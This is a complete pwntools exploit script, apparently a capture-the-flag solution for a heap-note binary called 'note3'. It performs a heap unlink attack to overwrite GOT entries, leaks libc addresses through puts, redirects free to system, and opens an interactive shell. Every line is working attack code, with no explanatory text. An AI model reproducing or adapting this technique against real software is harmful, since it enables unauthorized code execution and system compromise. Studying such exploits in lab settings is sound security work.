#coding:utf-8
from pwn import *
p=process("./note3")
e=ELF("/lib/x86_64-linux-gnu/libc.so.6")
setvbuf_off=e.symbols["setvbuf"]
system_off=e.symbols["system"]
atoi_off=e.symbols["atoi"]
def new(length,content):
    p.sendlineafter("--->>","1")
    p.sendlineafter("(less than 1024)",str(length))
    p.sendlineafter(" content:",content)
    print p.recvline()
def edit(idx,data):
    print p.sendlineafter("--->>","3")
    print p.sendlineafter("note:",str(idx))
    print p.sendlineafter("ent:",data)
    print p.recvuntil("success")
def dlt(idx):
    p.sendlineafter("--->>","4")
    p.sendlineafter("note:",str(idx))
    print p.recvuntil("success")

new(232,"aaa")
new(0,"bbb")
new(232,"ccc")
new(232,"ddd")
new(232,"/bin/sh\00")
dlt(1)
bb=0x6020d8
fd=bb-24
bk=bb-16
pay="P"*(0x10)+p64(0)*3+p64(0xe1)\
+p64(fd)+p64(bk)\
+"p"*(232-16-16+8-16)+p64(0xe0)+p64(0xf0)+"aaa"
new(0,pay)
dlt(3)
free_got=0x0602018
puts_plt=0x00400730
pay=p64(0xdeadbeef)+p64(free_got)
edit(2,pay)

pay=p64(puts_plt)[:-1]
edit(0,pay)
atoi_got=0x602070
pay=p64(0xdeadbeef)+p64(atoi_got)
edit(2,pay)
# raw_input("xxx")

p.sendlineafter("--->>","4")
p.sendlineafter("note:\n",str(0))
kk=p.recvuntil("\n")[:-1]
atoi=u64(kk.ljust(8,"\00"))
base=atoi-atoi_off
system=system_off+base
print hex(base)
print hex(system)
print hex(atoi)

pay=p64(0xdeadbeef)+p64(free_got)
edit(2,pay)


pay=p64(system)[:-1]
edit(0,pay)

gdb.attach(p,'''
     x /32gx 0x006020C0
     b *0x400BB9
''')

p.sendlineafter("--->>","4")
print "get shell ...."
p.sendlineafter("note:",str(4))
p.interactive()
